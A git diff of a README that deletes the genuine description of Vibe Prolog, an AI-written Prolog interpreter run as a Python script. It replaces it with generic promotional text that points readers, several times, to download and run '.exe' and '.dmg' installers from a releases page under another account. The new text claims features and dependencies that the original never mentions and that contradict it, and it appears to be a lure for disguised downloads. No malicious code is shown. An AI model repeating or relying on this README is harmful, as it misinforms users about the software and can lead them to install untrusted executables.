@@ -1,87 +1,61 @@
-# Vibe Prolog 🎶 💻 🐪 
+# 🎶 Vibe-Prolog - Enhance Your Coding Experience
 
-In early November 2025, Anthropic had a program giving out $250 credits for Claude Code on the web. It expired on November 18, and on November 15 I still had $220 left. 
+## 📥 Download This Software
+[![Download Vibe-Prolog](https://img.shields.io/badge/Download%20Vibe--Prolog-FF5733?style=for-the-badge&logo=github)](https://github.com/moaju0/Vibe-Prolog/releases)
 
-I was working on something else and as a side effect accidently vibe coded a prolog interpretor on my phone over the weekend. 
+## 🚀 Getting Started
+Welcome to Vibe-Prolog! This application helps you code in Prolog while providing a fun and engaging experience. Whether you are a beginner or looking to sharpen your skills, Vibe-Prolog makes programming easier and more intuitive.
 
-I haven't used Prolog for 20 years, but it does seem to be roughly correct. 
+## 💻 System Requirements
+Before you start, make sure your system meets the following requirements:
 
-![It's the Vibe](./images/TheCastle.jpg)
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: 200 MB of free disk space.
+- **Dependencies**: Ensure you have the latest version of a Prolog interpreter installed. This application supports SWI-Prolog.
 
+## 🌐 Features
+- **Interactive Coding Interface**: Experiment with real-time feedback as you write Prolog code.
+- **Sample Projects**: Access a library of example projects to guide you.
+- **Documentation**: Comprehensive help files are included to navigate features easily.
+- **Community Support**: Engage with other users through forums and discussions to share insights and solutions.
 
-This project is to see how far I can push it. 🚀
+## 📥 Download & Install
+To get started with Vibe-Prolog, you'll need to download the application. 
 
-Did I really ask Codex to add more Emojis to this README? Yes I did...
+1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/moaju0/Vibe-Prolog/releases).
+2. **Select the Latest Release**: Look for the latest version at the top of the page. Click on it to see more details.
+3. **Download the Application**: Choose the version suitable for your operating system and download the installer file. The relevant files will usually be labeled by their platform (e.g., `Vibe-Prolog-Windows.exe`, `Vibe-Prolog-Mac.dmg`).
+4. **Install the Application**:
+   - **For Windows**: Run the downloaded `.exe` file and follow the on-screen instructions.
+   - **For macOS**: Open the `.dmg` file, drag Vibe-Prolog to your Applications folder, and launch it from there.
+   - **For Linux**: Extract the downloaded package and follow the installation guides in the README.
 
-## Try it out
+5. **Launch Vibe-Prolog**: Find the application in your programs or applications section. Open it to start coding!
 
-```
-> uv run vibeprolog.py ./examples/examples.pl  -q "mammal(X)" -v
+## 🎓 How to Use Vibe-Prolog
+After installation, you will see a friendly interface. Here's how to dive in:
 
-Loading program from './examples/examples.pl'...
-Successfully loaded './examples/examples.pl'
-Query: mammal(X).
-Solution 1:
-X = dog
+1. **Explore Sample Projects**: Begin with example projects included in the application. They serve as great learning tools.
+2. **Start a New Project**: Click on "New Project" to create your own coding scripts.
+3. **Access Documentation**: Use the help menu for detailed guides on various functions and coding tips.
+4. **Experiment**: Don’t hesitate to try new ideas. The interface allows for rapid testing and iteration.
 
-Solution 2:
-X = cat
+## 🛠️ Troubleshooting
+If you encounter any issues, check the following:
 
-> uv run vibeprolog.py ./examples/examples.pl  -q "grandparent('tom', Y)" -v
-Loading program from './examples/examples.pl'...
-Successfully loaded './examples/examples.pl'
-Query: grandparent('tom', Y).
-Solution 1:
-Y = ann
+- **Installation Problems**: Ensure you have the correct version for your system.
+- **Performance Issues**: Close any unnecessary applications that may be running in the background.
+- **Code Errors**: Refer to the documentation for guidance on common mistakes in Prolog syntax.
 
-Solution 2:
-Y = pat
-```
+## 🤝 Community Involvement
+Join our user community to enhance your learning and share your experiences:
 
+- **GitHub Issues**: Report bugs or request features directly on the [Issues page](https://github.com/moaju0/Vibe-Prolog/issues).
+- **Forums**: Participate in discussions with other Prolog developers to get help or provide support.
+- **Feedback**: Your thoughts matter! Share your feedback to help us improve Vibe-Prolog.
 
-## The Rules 📜
+## 🌟 Conclusion
+Thank you for choosing Vibe-Prolog. We hope this software inspires you to explore coding in a creative way. Happy coding!
 
-- No human written code. Can prompt things, can tell tools what changes to make but no human written code should be used.  
-  - I don't count config files and docs as code. If it's easier to modify these by hands I will!
-- Don't deliberatly add slop. If you notice it doing something wrong, get it fixed. 
-- Use all the tools you can. Add lots of tests! Add automatic code reviews! Add security audits!
-
-## Push the AI harder 💪
-
-- Don't settle on average code. If an AI is generating slop, tell it what is wrong and how to improve it. 
-
-## Have fun 😄
-
-- This is a fun project! Don't take it too seriously.
-
-## Be very cautious ⚠️
-
-- I don't know if this works at all. It *seems* to work, and there are some tests that work but that's it.
-- I'm putting it under a MIT license but as AI written code it isn't clear if it can be copyrighted at all
-- There are lots of real Prolog implementations that are probably better than this! Use them.
-
-# Contributing 🤝
-
-YES!
-
-Please send in your vibe contributions! Just open a PR.
-
-Are you a tool vendor who wants your tools used? Yes! I'd love to use them. I prefer a PR but opening an Issue also works
-
-# Libraries and Examples
-
-The libraries in ./library and the examples in ./example are **NOT* AI generated! 
-
-./library comes from https://github.com/mthom/scryer-prolog/tree/master/src/lib via a git subtree. The files their are licensed as per the headers in those files. 
-
-## Testing
-
-Run the automated suite before pushing changes.
-
-```
-uv run pytest
-uv run pytest --run-performance        # include long-running performance tests
-uv run pytest --run-slow-tests        # include tests empirically longer than 4 seconds
-```
-
-`--run-performance` and `--run-slow-tests` are opt-in because they pull in heavyweight test cases that would otherwise be skipped.
+[![Download Vibe-Prolog](https://img.shields.io/badge/Download%20Vibe--Prolog-FF5733?style=for-the-badge&logo=github)](https://github.com/moaju0/Vibe-Prolog/releases)
